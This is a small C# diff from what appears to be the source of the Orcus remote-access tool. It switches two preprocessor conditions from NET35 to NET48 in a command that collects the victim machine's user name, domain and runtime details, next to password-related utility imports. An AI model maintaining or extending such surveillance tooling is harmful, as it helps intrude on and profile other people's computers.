@@ -16,7 +16,7 @@ using Orcus.Commands.Passwords.Utilities;
 using Orcus.Shared.Commands.ComputerInformation;
 using Orcus.Utilities;
 using Screen = Orcus.Shared.Commands.ComputerInformation.Screen;
-#if NET35
+#if NET48
 using Orcus.Extensions;
 #endif
 
@@ -78,7 +78,7 @@ namespace Orcus.Commands.ComputerInformation
                 ClrVersion = Environment.Version.ToString(),
                 UserName = Environment.UserName,
                 UserDomainName = Environment.UserDomainName,
-#if NET35
+#if NET48
                 SystemPageSize = EnvironmentExtensions.SystemPageSize
 #else
                 SystemPageSize = Environment.SystemPageSize
